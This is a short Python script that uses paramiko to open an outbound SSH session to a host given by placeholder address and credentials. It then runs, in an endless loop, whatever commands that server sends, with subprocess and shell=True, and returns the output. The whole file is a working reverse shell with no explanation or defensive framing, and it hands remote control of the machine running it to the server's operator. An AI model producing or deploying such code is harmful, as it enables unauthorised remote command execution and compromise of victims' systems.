#!/usr/bin/python

import threading
import paramiko
import subprocess

def ssh_command(ip,user,passwd,command):
  client = paramiko.SSHClient()

  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  client.connect(ip,username=user,password=passwd)
  ssh_session = client.get_transport().open_session()

  if ssh_session.active:
    ssh_session.send(command)
    print(ssh_session.recv(1024).decode()) # read banner

    while True:
      command = ssh_session.recv(1024).decode() # get the command from the SSH server
      try:
        cmd_output = subprocess.check_output(command,shell=True)
        ssh_session.send(cmd_output)
      except Exception as e:
        try:
          ssh_session.send(str(e).encode())
        except:
          pass

    client.close()

  return

ssh_command('<IP>','<USER>','<PASS>','ClientConnected')